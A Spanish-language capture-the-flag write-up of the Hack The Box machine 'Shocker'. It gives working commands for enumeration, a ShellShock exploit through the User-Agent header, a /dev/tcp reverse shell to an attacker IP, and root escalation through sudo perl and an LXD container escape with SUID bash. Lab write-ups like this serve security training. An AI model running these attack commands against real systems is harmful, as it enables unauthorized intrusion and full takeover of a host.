---
layout: post
title: HTB_Shocker
date: 2023/07/10
slug: HTB_Shocker
heroImage: /assets/machines.jpg
---

# Shocker {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se shocker.

El replay del live se puede ver aqui

[![S4vitaar Shocker maquina](https://img.youtube.com/vi/7BGLph5TWMY/0.jpg)](hhttps://www.youtube.com/watch?v=7BGLph5TWMY)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.56
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.56
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.56 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,2222 10.10.10.56 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 80     | http     | Web, Fuzzing       |                      |
| 2222   | ssh      | Conneccion directa | usuario y contraseña |




### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.56
```

Nada interesante aqui

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.56 -oN webScan
```

Nada interesante.

#### Analyzando la web con Firefox {-}

Hay una pagina que nos dice *Don't Bug Me!* y nada mas. Como la maquina se llama Shocker, pensamos directamente al ataque ShellShock

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/
```

Encontramos una routa muy interesante que es el 
```bash
 cgi-bin 
```
 que es la routa donde si la bash es vulnerable podemos hacer un ataque shellshock.

## Vulnerability Assessment {-}

### ShellShock attack {-}

1. creamos un diccionario de extensiones

    ```bash
    nano extension.txt

    sh
    pl
    py
    cgi
    ```

1. lanzamos nuevamente wfuzz con la extension

    ```bash
    wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extension.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
    ```

Como aqui hemos encontrado un fichero 
```bash
 user.sh 
```
 lanzamos un curl para ver lo que es.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh"
```

Ya podemos lanzar el ataque shellshock cambiando la cabezera User-Agent.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; }; /usr/bin/whoami"
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /usr/bin/whoami"
```

Vemos la respuesta shelly quiere decir que estamos en capacidad de ejecutar commandos a nivel de systema, gracias a esta vulnerabilidad.## Vuln exploit & Gaining Access {-}

### Ganando accesso desde la vulnerabilidad ShellShock {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Entablamos una reverse shell

    ```bash
    curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.10.14.7/443 0>&1
    ```

Hemos ganado accesso al systema.


### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a 
```bash
 whoami 
```
 vemos que ya estamos shelly y que podemos leer la flag.## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
```

Vemos que estamos en el grupo lxd ;) y ademas podemos ejecutar /usr/bin/perl como root si proporcionar contraseña.

### Escalar privilegios con /usr/bin/perl {-}

```bash
sudo -u root perl -e 'exec "/bin/sh"'
whoami 
#Output
root
```

### Escalar privilegios con LXD {-}

```bash
searchsploit lxd
searchsploit -x 46978
```

Si Si el exploit a sido creado por el mismo S4vitar. Para usar el exploit, lo primero es mirar si estamos en una maquina 32 o 64 bits.

```bash
uname -a
```

Seguimos los passos del exploit

1. En la maquina de attaquante

    ```bash
    wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
    chmod +x build-alpine
    ./build-alpine # --> para maquinas x64
    ./build-alpine -a i686 # --> para maquinas i686
    searchsploit -m 46978
    mv 46978.sh lxd_privesc.sh
    dos2unix lxd_privesc.sh
    python3 -m http.server 80
    ```

1. En la maquina victima

    ```bash
    wget http://10.10.14.20/alpine-v3-14-i686-20210728_2134.tar.gz
    wget http://10.10.14.20/lxd_privesc.sh
    chmod +x lxd_privesc.sh
    ./lxd_privesc.sh -f alpine-v3-14-i686-20210728_2134.tar.gz
    ```

1. vemos un error 
```bash
 error: This must be run as root 
```
. Modificamos el fichero lxd_privesc.sh

    ```bash
    nano lxd_privesc.sh
    ```

    en la function createContainer(), borramos la primera linea:
    
    ```bash
    # lxc image import $filename --alias alpine && lxd init --auto
    ```

1. Ya estamos root pero en el contenedor. Modificamos la 
```bash
 /bin/bash 
```
 de la maquina

    - en el contenedor

        ```bash
        cd /mnt/root
        ls
        cd /bin
        chmod 4755 bash
        exit
        ```

    - en la maquina victima

        ```bash
        bash -p
        whoami
        #Output
        root
        ```

